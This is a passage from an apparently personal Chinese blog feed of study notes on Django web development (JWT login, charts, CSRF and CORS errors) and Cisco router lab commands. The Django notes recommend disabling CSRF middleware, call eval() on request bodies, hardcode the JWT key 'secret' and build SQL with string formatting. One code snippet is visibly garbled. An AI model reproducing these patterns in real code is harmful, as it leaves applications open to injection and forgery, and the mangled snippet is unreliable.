    <content type="html"><![CDATA[<h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><p><code>python manage.py runserver 127.0.0.1:28000</code></p><h2 id="将现有数据库导入到models-py中"><a href="#将现有数据库导入到models-py中" class="headerlink" title="将现有数据库导入到models.py中"></a>将现有数据库导入到models.py中</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">python manage.py inspectdb &gt; app/models.py<br></code></pre></td></tr></table></figure><h2 id="js实现定时刷新页面"><a href="#js实现定时刷新页面" class="headerlink" title="js实现定时刷新页面"></a>js实现定时刷新页面</h2><p><a href="https://blog.csdn.net/baidu_38990811/article/details/79172163">Ajax轮询,Ajax长轮询和websocket(详细使用)</a></p><h2 id="django-shell-调试"><a href="#django-shell-调试" class="headerlink" title="django shell 调试"></a>django shell 调试</h2><p><code>python manage.py shell</code></p><h3 id="python小问题"><a href="#python小问题" class="headerlink" title="python小问题"></a>python小问题</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">orders_num = ordersdate = orders_car_size = orders_price = []<br></code></pre></td></tr></table></figure><img src="/2020/04/03/django%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/image-20200322135749091.png" class="" title="image-20200322135749091"><p>会指向同一个内存地址QAQ</p><p>叫引用赋值</p><h2 id="问题解决"><a href="#问题解决" class="headerlink" title="问题解决"></a>问题解决</h2><h3 id="访问不到写好的path"><a href="#访问不到写好的path" class="headerlink" title="访问不到写好的path"></a>访问不到写好的path</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">urlpatterns = [   path(<span class="hljs-string">&#x27;addUsers/&#x27;</span>,views.add_users,name=<span class="hljs-string">&#x27;add_users&#x27;</span>)<span class="hljs-comment">#api/addUsers</span><br>]<br></code></pre></td></tr></table></figure><p>检查path(‘path/‘)的斜杠</p><h3 id="Django-用postman进行post请求时：Forbidden-CSRF-cookie-not-set-403"><a href="#Django-用postman进行post请求时：Forbidden-CSRF-cookie-not-set-403" class="headerlink" title="Django 用postman进行post请求时：Forbidden (CSRF cookie not set.) 403"></a>Django 用postman进行post请求时：Forbidden (CSRF cookie not set.) 403</h3><p>注释掉settings.py中的<br>MIDDLEWARE 的 ‘django.middleware.csrf.CsrfViewMiddleware’ </p><p><strong>连接mysql出错</strong></p><p>django.db.utils.OperationalError: (2059) <a href="https://www.jianshu.com/p/e6e6293af2dc">解决办法</a></p><p><strong>orm查询</strong></p><p><a href="https://www.cnblogs.com/chenxinming-top/p/9506857.html">https://www.cnblogs.com/chenxinming-top/p/9506857.html</a></p><p><strong>引入bootstrap网站错位</strong></p><p>可能原本就引入了（XD</p><p><strong>异步加载数据</strong></p><p>从mysql读取数据，然后放置到echarts中，效果如图</p><img src="/2020/04/03/django%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/image-20200222230043961.png" class="" title="image-20200222230043961"><p>echarts js</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;div id=<span class="hljs-string">&quot;main&quot;</span> style=<span class="hljs-string">&quot;width: 790px;height:600px;&quot;</span>&gt;&lt;/div&gt;<br>    &lt;script type=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;<br>      <span class="hljs-keyword">var</span> develop_name_list = &#123;&#123; develop_name_list|safe &#125;&#125;;<br>      <span class="hljs-keyword">var</span> develop_num_list = &#123;&#123; develop_num_list|safe &#125;&#125;;<br>      <span class="hljs-keyword">var</span> myChart = echarts.init(<span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&#x27;main&#x27;</span>));<br>      <span class="hljs-keyword">var</span> option = &#123;<br>          grid: &#123;<span class="hljs-attr">containLabel</span>: <span class="hljs-literal">true</span>&#125;,<br>          xAxis: &#123;<span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;数量&#x27;</span>&#125;,<br>          yAxis: &#123;<br>            type: <span class="hljs-string">&#x27;category&#x27;</span>,<br>            data: develop_name_list<br>            &#125;,<br>          series: [<br>              &#123;<br>                  type: <span class="hljs-string">&#x27;bar&#x27;</span>,<br>                  encode: &#123;<span class="hljs-attr">x</span>: <span class="hljs-string">&#x27;amount&#x27;</span>,<span class="hljs-attr">y</span>: <span class="hljs-string">&#x27;product&#x27;</span>&#125;,<br>                  data: develop_num_list<br>              &#125;<br>          ]<br>      &#125;;<br>      myChart.setOption(option);<br>    &lt;/script&gt;<br></code></pre></td></tr></table></figure><p><code>&#123;&#123; develop_name_list|safe &#125;&#125;</code> 的<code>|safe</code>是必须的，<code>myChart.setOption(option);</code>也是必须的，并且</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js">yAxis: &#123;<br>            type: <span class="hljs-string">&#x27;category&#x27;</span>,<br>            data: develop_name_list<br>            &#125;,<br></code></pre></td></tr></table></figure><p>的type:也一定时category==目前仅知道针对这个图可行==</p><h3 id="使用bootstrap折叠面板之后在里面放置js不渲染"><a href="#使用bootstrap折叠面板之后在里面放置js不渲染" class="headerlink" title="使用bootstrap折叠面板之后在里面放置js不渲染"></a>使用bootstrap折叠面板之后在里面放置js不渲染</h3><p>还没会，无解qaq</p><h3 id="python模糊查询-问题"><a href="#python模糊查询-问题" class="headerlink" title="python模糊查询%问题"></a>python模糊查询%问题</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">sql = <span class="hljs-string">&#x27;&#x27;&#x27; SELECT job_Name,description FROM history</span><br><span class="hljs-string">                WHERE job_Name like &quot;%%&#123;&#125;%%&quot; and job_Name like &quot;%%&#123;&#125;%%&quot;&#x27;&#x27;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-string">&#x27;java&#x27;</span>,<span class="hljs-string">&#x27;后端&#x27;</span>)<br></code></pre></td></tr></table></figure><h2 id="Get方法"><a href="#Get方法" class="headerlink" title="Get方法"></a>Get方法</h2><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Scan_Detail</span>(<span class="hljs-title">TemplateView</span>):</span><br>    template_name = <span class="hljs-string">&#x27;scandetails.html&#x27;</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get</span><span class="hljs-params">(<span class="hljs-keyword">self</span>, request, *args, **kwargs)</span></span><span class="hljs-symbol">:</span><br>        <span class="hljs-keyword">self</span>.target = request.GET.get(<span class="hljs-string">&#x27;target&#x27;</span>)<br>        <span class="hljs-keyword">self</span>.timestamp = request.GET.get(<span class="hljs-string">&#x27;timestamp&#x27;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">super</span>().get(request, *args, **kwargs)<br>    <br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_context_data</span><span class="hljs-params">(<span class="hljs-keyword">self</span> , **kwargs)</span></span><span class="hljs-symbol">:</span><br>        context = <span class="hljs-keyword">super</span>().get_context_data(**kwargs)<br>        data_list = NetworkSegmentVuln_sql(<span class="hljs-keyword">self</span>.target,<span class="hljs-keyword">self</span>.timestamp)<br>        <span class="hljs-keyword">return</span> context<br></code></pre></td></tr></table></figure><img src="/2020/04/03/django%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/image-20200315130344606.png" class="" title="image-20200315130344606"><h2 id="接收header或body"><a href="#接收header或body" class="headerlink" title="接收header或body"></a>接收header或body</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"> 获取正则匹配到的数据,num1未位置参数,num2为命名参数,<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">index</span>(<span class="hljs-params">request,num2=<span class="hljs-literal">None</span>, num1=<span class="hljs-literal">None</span></span>):</span><br> <span class="hljs-built_in">print</span>(num2)<br> <span class="hljs-comment"># 构造响应数据</span><br> reNT<span class="hljs-string">&#x27;)</span><br><span class="hljs-string"> sp = HttpResponse(&#x27;</span>hello world<span class="hljs-string">&#x27;)</span><br><span class="hljs-string"> # 获取请求头</span><br><span class="hljs-string"> header = request.META.get(&#x27;</span>HTTP_USER_AGE)<br> <span class="hljs-comment"># 获取地址</span><br> path = request.path<br> <span class="hljs-comment"># 获取GET后面的数据(获取查询字符串数据)</span><br> para = request.GET()<br> <span class="hljs-comment"># 获取json数据</span><br> json_data = request.body<br> data = <span class="hljs-built_in">eval</span>(request.body.decode()).get(<span class="hljs-string">&#x27;asd&#x27;</span>)<br> data1 = json.loads(request.body).get(<span class="hljs-string">&#x27;asd&#x27;</span>)<br> <span class="hljs-comment"># 获取表单数据</span><br> form_data = request.POST<br> <span class="hljs-comment"># 获取请求方法</span><br> method = request.method<br> <span class="hljs-comment"># 获取文件</span><br> file_obj = request.FILES.get(<span class="hljs-string">&#x27;image&#x27;</span>)<br> <span class="hljs-keyword">return</span> resp<br></code></pre></td></tr></table></figure><h2 id="token和cookie"><a href="#token和cookie" class="headerlink" title="token和cookie"></a>token和cookie</h2><p><a href="https://www.cnblogs.com/moyand/p/9047978.html">参考资料</a></p><p>大部分api和web应用都用tokens，例如fb，google，推特，gihub</p><p>实现方法是JSON Web Tokens</p><p><a href="https://www.v2ex.com/t/530103">详细-有案例-Django+JWT 实现 Token 认证</a></p><p><a href="https://juejin.im/post/59749e3751882559274bc80d#heading-11?tdsourcetag=s_pctim_aiomsg">理解JWT（JSON Web Token）认证及python实践</a></p><p><a href="https://juejin.im/post/5df04203e51d45581269a146?tdsourcetag=s_pctim_aiomsg">python接口自动化（二十）–token登录（详解）</a></p><p>可用库：<a href="https://github.com/jpadilla/pyjwt/">pyjwt</a></p><h2 id="响应"><a href="#响应" class="headerlink" title="响应"></a>响应</h2><p>所有响应包含三部分，状态码 code、数据 data、消息 msg<br>所有内容都在 data 里，msg 是附加的状态消息</p><p>最后用了简单方法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#后端</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">create_token</span>(<span class="hljs-params">users_id,users_name</span>):</span><br>    payload = &#123;<br>        <span class="hljs-string">&quot;iss&quot;</span>: <span class="hljs-string">&quot;parkingapp.com&quot;</span>,<br>         <span class="hljs-string">&quot;iat&quot;</span>: <span class="hljs-built_in">int</span>(time.time()),<br>         <span class="hljs-string">&quot;exp&quot;</span>: <span class="hljs-built_in">int</span>(time.time()) + <span class="hljs-number">86400</span> * <span class="hljs-number">7</span>,<br>         <span class="hljs-string">&quot;users_id&quot;</span>: users_id,<br>         <span class="hljs-string">&quot;user_name&quot;</span>: users_name,<br>    &#125;<br>    token = jwt.encode(payload, <span class="hljs-string">&#x27;secret&#x27;</span>, algorithm=<span class="hljs-string">&#x27;HS256&#x27;</span>).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    json_dict_success = &#123;<span class="hljs-string">&#x27;code&#x27;</span>: Httpcode.success,<span class="hljs-string">&#x27;token&#x27;</span>: <span class="hljs-built_in">str</span>(token)&#125;<br>    <span class="hljs-keyword">return</span> JsonResponse(json_dict_success, json_dumps_params=&#123;<span class="hljs-string">&#x27;ensure_ascii&#x27;</span>: <span class="hljs-literal">False</span>&#125;)<br><br></code></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;!-- js --&gt;<br>$.ajax(&#123;<br>type: <span class="hljs-string">&#x27;POST&#x27;</span>,<br>url: <span class="hljs-string">&#x27;http://localhost:8000&#x27;</span>+ add_users_api,<br>data: &#123;<span class="hljs-attr">users_name</span>: name,<br>        users_email: email,<br>        users_phone: phone&#125;,<br>success: <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">data</span>) </span>&#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-number">201</span> === data.code)&#123;<br>alert(<span class="hljs-string">&quot;注册成功！&quot;</span>);<br><span class="hljs-built_in">localStorage</span>.setItem(<span class="hljs-string">&quot;token&quot;</span>, data.token);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>alert(<span class="hljs-string">&quot;注册失败，请在检查网络后重试！&quot;</span>);<br>&#125;<br> &#125;,<br>error: <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">data</span>) </span>&#123;<br>alert(<span class="hljs-string">&quot;注册失败，请在检查网络后重试！&quot;</span>)<br> &#125;,<br>&#125;);<br><br></code></pre></td></tr></table></figure><h3 id="识别token"><a href="#识别token" class="headerlink" title="识别token"></a>识别token</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> token = <span class="hljs-built_in">localStorage</span>.getItem(<span class="hljs-string">&#x27;token&#x27;</span>);<br><span class="hljs-built_in">console</span>.log(token);<br><span class="hljs-keyword">if</span> (<span class="hljs-literal">null</span> === token)&#123;<br>alert(<span class="hljs-string">&quot;请先登录或注册账户&quot;</span>);<br>&#125;<br>$.ajax(&#123;<br>type: <span class="hljs-string">&#x27;POST&#x27;</span>,<br>url: <span class="hljs-string">&#x27;http://localhost:8000&#x27;</span>+ verify_token,<br>data: &#123;<span class="hljs-attr">token</span>: token&#125;,<br>success: <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">data</span>)</span>&#123;<br>alert(<span class="hljs-string">&#x27;验证成功&#x27;</span>);<br>&#125;,<br>error: <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">data</span>)</span>&#123;<br>alert(data)<br>&#125;,<br>&#125;);<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">verify_token</span>(<span class="hljs-params">request</span>):</span><br>    token = request.POST.get(<span class="hljs-string">&#x27;token&#x27;</span>,<span class="hljs-number">0</span>)<br>    result = jwt.decode(token, <span class="hljs-string">&#x27;secret&#x27;</span>, algorithm=<span class="hljs-string">&#x27;HS256&#x27;</span>)<br></code></pre></td></tr></table></figure><h3 id="回传数据"><a href="#回传数据" class="headerlink" title="回传数据"></a>回传数据</h3><p>一开始是</p><img src="/2020/04/03/django%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/image-20200322164623665.png" class="" title="image-20200322164623665"><p>大佬推荐改成如下图，面向对象</p><img src="/2020/04/03/django%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%7B603E00A4-D802-FAFC-F8C6-D56187F2F88A%7D.jpg" class="" title="img"><h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><h3 id="前端post数据到后端，后端接收到请求但无数据传递"><a href="#前端post数据到后端，后端接收到请求但无数据传递" class="headerlink" title="前端post数据到后端，后端接收到请求但无数据传递"></a>前端post数据到后端，后端接收到请求但无数据传递</h3><p>可能因为跨域</p><p>跨越定义 :由于浏览器同源策略，凡是发送请求的url的协议(http和https)、域名（<a href="http://www.example.com,about.example.com）、端口(8010和8020)三者之间任意一个与当前页面地址不同则视为跨域。">www.example.com,about.example.com）、端口(8010和8020)三者之间任意一个与当前页面地址不同则视为跨域。</a></p><p><a href="https://www.cnblogs.com/randomlee/p/9752705.html">https://www.cnblogs.com/randomlee/p/9752705.html</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>cisco课程代码记录</title>
    <link href="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/"/>
    <url>/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<p><strong>不记肯定会忘记QAQ,只敲简写然后敲tab也是可以的</strong></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">enable<br>configure terminal<br>hostname R1<br></code></pre></td></tr></table></figure><h2 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs awk">enable password xxx <span class="hljs-comment"># 设置用户执行密码</span><br>enable secret class <span class="hljs-comment"># 设置特权执行密码</span><br>line console <span class="hljs-number">0</span> <span class="hljs-comment">#线路密码</span><br>(config-line)password cisco<br>(config-line)login<br>(config-line)<span class="hljs-keyword">exit</span><br>line vty <span class="hljs-number">0</span> <span class="hljs-number">4</span> <span class="hljs-comment">#加密密码设置</span><br>(config-line)password class<br>(config-line)login<br>(config-line)<span class="hljs-keyword">exit</span><br>service password-encrytion <span class="hljs-comment">#加密纯文本密码</span><br></code></pre></td></tr></table></figure><h2 id="标语"><a href="#标语" class="headerlink" title="标语"></a>标语</h2><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gams">banner motd <span class="hljs-symbol">$</span> (<span class="hljs-symbol">$</span>是截止符号)<br>banner motd <span class="hljs-symbol">$</span> Authorized Access Only! <span class="hljs-symbol">$</span><br></code></pre></td></tr></table></figure><h2 id="保存配置"><a href="#保存配置" class="headerlink" title="保存配置"></a>保存配置</h2><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">copy running-config startup-config<br></code></pre></td></tr></table></figure><h2 id="端口设置"><a href="#端口设置" class="headerlink" title="端口设置"></a>端口设置</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs awk">interface f <span class="hljs-number">0</span>/<span class="hljs-number">0</span><br>(config-<span class="hljs-keyword">if</span>)description Link to Lan <span class="hljs-number">1</span><br>(config-<span class="hljs-keyword">if</span>)ip address <span class="hljs-number">192.168</span>.<span class="hljs-number">10.1</span> <span class="hljs-number">255.255</span>.<span class="hljs-number">255.0</span> <br>(config-<span class="hljs-keyword">if</span>)ipv6 address <span class="hljs-number">2001</span>:db8:acad:<span class="hljs-number">1</span>::<span class="hljs-number">1</span>/<span class="hljs-number">64</span> <span class="hljs-comment">#IPV6</span><br>(config-<span class="hljs-keyword">if</span>)no shutdown<br>(config-<span class="hljs-keyword">if</span>)<span class="hljs-keyword">exit</span><br><br><span class="hljs-comment">#Serial口 作为DCE 要附加上</span><br>(config-<span class="hljs-keyword">if</span>)clock rate <span class="hljs-number">128000</span><br><br><span class="hljs-comment">#Loopback环回接口</span><br>interface loopback <span class="hljs-number">0</span><br>(config-<span class="hljs-keyword">if</span>)ip address <span class="hljs-number">10.0</span>.<span class="hljs-number">0.1</span> <span class="hljs-number">255.255</span>.<span class="hljs-number">255.0</span><br>(config-<span class="hljs-keyword">if</span>)<span class="hljs-keyword">exit</span><br></code></pre></td></tr></table></figure><h2 id="show"><a href="#show" class="headerlink" title="show"></a>show</h2><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">show ip <span class="hljs-keyword">interface</span> <span class="hljs-symbol">brief</span><br><span class="hljs-symbol">show</span> <span class="hljs-symbol">ip</span> <span class="hljs-symbol">ipv6</span> <span class="hljs-symbol">brief</span><br><span class="hljs-symbol">show</span> <span class="hljs-symbol">ip</span> <span class="hljs-symbol">route</span><br><br></code></pre></td></tr></table></figure><h2 id="历史记录"><a href="#历史记录" class="headerlink" title="历史记录"></a>历史记录</h2><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs maxima"><span class="hljs-built_in">terminal</span> histroy size <span class="hljs-number">200</span><br><span class="hljs-built_in">show</span> history<br></code></pre></td></tr></table></figure><blockquote><p>IPv6 地址解析不使用 ARP 进程，而是使用 ICMPv6 邻居请求和邻居通告消息。IPv6 到 MAC 地址的映射保存在一个类似于 ARP 缓存的表中，称为邻居缓存。</p><p>代码字母 D 用于标识通过 EIGRP 获知的路由。</p><p>“最后选用网关”是另一台路由器的ip地址</p><p>默认静态路由用作最后选用网关</p><p><strong>S 10.2.0.0 [1/0] via 172.16.2.2</strong> 中，方括号内的数字分别表示管理距离和度量。</p><p>ROM 包含在硬件模块上执行的诊断操作</p><p>默认静态路由的 IPv6 地址和前缀为 ::/0。这表示地址中的所有零和前缀长度零</p></blockquote><h2 id="使用rip"><a href="#使用rip" class="headerlink" title="使用rip"></a>使用rip</h2><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">router</span> rip<br>network 网段<br></code></pre></td></tr></table></figure><h2 id="access-list"><a href="#access-list" class="headerlink" title="access-list"></a>access-list</h2><p>禁止访问</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs arduino">(config)<span class="hljs-meta">#access-list 1 deny host 24.17.2.18</span><br>(config)<span class="hljs-meta">#interface f0/0</span><br>(config-<span class="hljs-keyword">if</span>)<span class="hljs-meta">#ip access-group 1 in</span><br></code></pre></td></tr></table></figure><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">(config)<span class="hljs-meta">#access-list 1 permit any</span><br></code></pre></td></tr></table></figure><p>permit anything from the subnet 24.17.2.0. Access-list 102 permit IP 24.17.2.0 0.0.0.15 any log</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">Router1</span><span class="hljs-params">(config)</span></span><span class="hljs-number">#acc</span>ess-list <span class="hljs-number">102</span> permit ip <span class="hljs-number">24.17</span>.<span class="hljs-number">2.0</span> <span class="hljs-number">0.0</span>.<span class="hljs-number">0.15</span> any log<br></code></pre></td></tr></table></figure><p>allow telnet from 24.17.2.16</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">(config)<span class="hljs-meta">#access-list 101 permit tcp 24.17.2.16 0.0.0.15 any eq telnet</span><br></code></pre></td></tr></table></figure><h2 id="1-1-3-5-Configuring-IPv4-and-IPv6-Interfaces"><a href="#1-1-3-5-Configuring-IPv4-and-IPv6-Interfaces" class="headerlink" title="1.1.3.5  Configuring IPv4 and IPv6 Interfaces"></a>1.1.3.5  Configuring IPv4 and IPv6 Interfaces</h2><p>R1</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs awk">cisco<br>enable<br>class<br>config t<br>interf g0/<span class="hljs-number">0</span><br>ip add <span class="hljs-number">172.16</span>.<span class="hljs-number">20.1</span> <span class="hljs-number">255.255</span>.<span class="hljs-number">255.128</span><br>no shutdown<br><span class="hljs-keyword">exit</span><br>interf g0/<span class="hljs-number">1</span><br>ip add <span class="hljs-number">172.16</span>.<span class="hljs-number">20.129</span> <span class="hljs-number">255.255</span>.<span class="hljs-number">128</span><br>no shutdown <br><span class="hljs-keyword">exit</span><br><br></code></pre></td></tr></table></figure><p>R2</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">cisco</span><br><span class="hljs-attribute">enable</span><br><span class="hljs-attribute">class</span><br><span class="hljs-attribute">config</span> t<br><span class="hljs-attribute">interf</span> g<span class="hljs-number">0</span>/<span class="hljs-number">0</span><br><span class="hljs-attribute">ipv6</span> add <span class="hljs-number">2001</span>:DB<span class="hljs-number">8</span>:C<span class="hljs-number">0</span>DE:<span class="hljs-number">12</span>::<span class="hljs-number">1</span>/<span class="hljs-number">64</span><br><span class="hljs-attribute">ipv6</span> address FE<span class="hljs-number">80</span>::<span class="hljs-number">2</span> link-local<br><span class="hljs-attribute">no</span> shutdown<br><span class="hljs-attribute">interf</span> g<span class="hljs-number">0</span>/<span class="hljs-number">1</span><br><span class="hljs-attribute">ipv6</span> add <span class="hljs-number">2001</span>:DB<span class="hljs-number">8</span>:C<span class="hljs-number">0</span>DE:<span class="hljs-number">13</span>::<span class="hljs-number">1</span>/<span class="hljs-number">64</span><br><span class="hljs-attribute">ipv6</span> address FE<span class="hljs-number">80</span>::<span class="hljs-number">2</span> link-local<br><span class="hljs-attribute">no</span> shutdown<br><span class="hljs-attribute">ex</span><br></code></pre></td></tr></table></figure><p>测试</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ping</span> <span class="hljs-number">172.16.20.1</span><br><span class="hljs-attribute">ping</span> <span class="hljs-number">172.16.20.129</span><br><span class="hljs-attribute">ping</span> <span class="hljs-number">64.100.1.10</span><br><span class="hljs-attribute">ping</span> <span class="hljs-number">2001</span>:DB<span class="hljs-number">8</span>:C<span class="hljs-number">0</span>DE:<span class="hljs-number">12</span>::<span class="hljs-number">1</span><br><span class="hljs-attribute">ping</span> <span class="hljs-number">2001</span>:DB<span class="hljs-number">8</span>:C<span class="hljs-number">0</span>DE:<span class="hljs-number">13</span>::<span class="hljs-number">1</span><br><span class="hljs-attribute">ping</span> <span class="hljs-number">2001</span>:DB<span class="hljs-number">8</span>:<span class="hljs-number">100</span>:<span class="hljs-number">1</span>::A<br></code></pre></td></tr></table></figure><h2 id="1-1-4-5-Configuring-and-Verifying-a-Small-Network"><a href="#1-1-4-5-Configuring-and-Verifying-a-Small-Network" 